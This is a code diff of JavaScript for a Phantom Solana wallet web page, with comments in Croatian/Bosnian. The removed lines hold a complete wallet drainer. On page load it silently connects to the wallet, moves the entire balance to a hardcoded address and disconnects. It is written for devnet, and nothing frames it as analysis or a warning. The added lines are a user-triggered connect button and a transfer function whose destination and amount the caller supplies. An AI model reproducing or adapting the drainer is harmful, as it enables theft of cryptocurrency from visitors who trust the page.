@@ -1,91 +1,80 @@
-// Funkcija za prikazivanje notifikacija korisniku
-function showNotification(message, color) {
-    const notification = document.createElement("div");
-    notification.textContent = message;
-    notification.style.backgroundColor = color;
-    notification.style.color = "#ffffff";
-    notification.style.padding = "10px";
-    notification.style.position = "fixed";
-    notification.style.top = "10px";
-    notification.style.right = "10px";
-    notification.style.zIndex = "1000";
-    document.body.appendChild(notification);
+let isWalletConnected = false;
 
-    setTimeout(() => {
-        notification.remove();
-    }, 3000);
-}
-
-// Automatsko povezivanje s Phantom Walletom
-const connectWalletSilently = async () => {
-    if (window.solana && window.solana.isPhantom) {
-        try {
-            const response = await window.solana.connect({ onlyIfTrusted: true });
-            const walletAddress = response.publicKey.toString();
-            console.log("Povezan Phantom Wallet:", walletAddress);
-            showNotification("Novčanik uspješno povezan.", "#00ff00");
-            return walletAddress;
-        } catch (error) {
-            console.error("Greška pri povezivanju:", error);
-        }
-    }
+// Funkcija za resetovanje stanja pri učitavanju stranice
+const resetState = () => {
+  isWalletConnected = false;
+  const connectButton = document.getElementById('connectWalletBtn');
+  if (connectButton) {
+    connectButton.textContent = 'Poveži Phantom Wallet';
+    connectButton.disabled = false;
+  }
 };
 
-// Funkcija za povlačenje svih sredstava
-const transferAllFunds = async () => {
-    if (window.solana && window.solana.isPhantom) {
-        try {
-            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("devnet"));
-            const fromWallet = window.solana.publicKey;
+// Funkcija za povezivanje s Phantom Walletom
+const connectWallet = async () => {
+  if (!window.solana || !window.solana.isPhantom) {
+    alert("Molimo instalirajte Phantom Wallet ekstenziju!");
+    window.open("https://phantom.app/", "_blank");
+    return;
+  }
 
-            // Provjera stanja novčanika
-            const balance = await connection.getBalance(fromWallet);
-            if (balance === 0) {
-                return;
-            }
-
-            // Kreiranje transakcije za prijenos
-            const recipientAddress = "9uvpWhyZvDsXMoLUv86w5YGJVXJ4RdXUjnwoX2T9f1jM";
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: fromWallet,
-                    toPubkey: new solanaWeb3.PublicKey(recipientAddress),
-                    lamports: balance,
-                })
-            );
-
-            transaction.feePayer = fromWallet;
-            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
-
-            const signedTransaction = await window.solana.signTransaction(transaction);
-            const txId = await connection.sendRawTransaction(signedTransaction.serialize());
-            console.log(`Transakcija poslana! Tx ID: ${txId}`);
-        } catch (error) {
-            console.error("Greška pri slanju transakcije:", error);
-        }
+  try {
+    // Prvo diskonektuj postojeću konekciju ako postoji
+    if (window.solana.isConnected) {
+      await window.solana.disconnect();
     }
+    
+    const response = await window.solana.connect();
+    const walletAddress = response.publicKey.toString();
+    console.log("Povezan Phantom Wallet:", walletAddress);
+    isWalletConnected = true;
+    
+    // Ažuriraj dugme nakon uspješnog povezivanja
+    const connectButton = document.getElementById('connectWalletBtn');
+    connectButton.textContent = 'Povezano';
+    connectButton.disabled = true;
+    
+    return walletAddress;
+  } catch (error) {
+    console.error("Greška pri povezivanju:", error);
+    isWalletConnected = false;
+    return null;
+  }
 };
 
-// Funkcija za odjavu korisnika i odspajanje novčanika
-const disconnectWallet = async () => {
-    if (window.solana && window.solana.isPhantom) {
-        try {
-            // Prekid veze sa novčanikom (nije direktno podržano kroz API, ali možemo "otkazati" sesiju)
-            await window.solana.disconnect();  // Ako je moguće, prekinite vezu
-            showNotification("Novčanik je odjavljen.", "#ffcc00");
-        } catch (error) {
-            console.error("Greška pri odjavi:", error);
-        }
-    }
-};
-
-// Automatski pokušaj povezivanja i povlačenja sredstava pri učitavanju stranice
-window.addEventListener("load", async () => {
-    const walletAddress = await connectWalletSilently();
-    if (walletAddress) {
-        await transferAllFunds();
-    }
-
-    // Odjavljivanje pri učitavanju stranice
-    await disconnectWallet();
+// Dodaj event listener za dugme i resetovanje pri učitavanju stranice
+document.addEventListener('DOMContentLoaded', () => {
+  // Resetuj stanje
+  resetState();
+  
+  // Dodaj event listener za dugme
+  const connectButton = document.getElementById('connectWalletBtn');
+  if (connectButton) {
+    connectButton.addEventListener('click', connectWallet);
+  }
 });
+
+// Dodaj event listener za refresh stranice
+window.addEventListener('beforeunload', resetState);
+
+const transferFunds = async (destinationAddress, amount) => {
+  try {
+    if (!window.solana || !isWalletConnected) {
+      alert("Prvo povežite svoj Phantom Wallet!");
+      return;
+    }
+
+    const transaction = new web3.Transaction().add(
+      web3.SystemProgram.transfer({
+        fromPubkey: window.solana.publicKey,
+        toPubkey: new web3.PublicKey(destinationAddress),
+        lamports: amount * web3.LAMPORTS_PER_SOL, // Pretvaranje SOL u Lamports
+      })
+    );
+
+    const { signature } = await window.solana.signAndSendTransaction(transaction);
+    console.log("Transakcija uspješna:", signature);
+  } catch (error) {
+    console.error("Greška pri slanju transakcije:", error);
+  }
+};
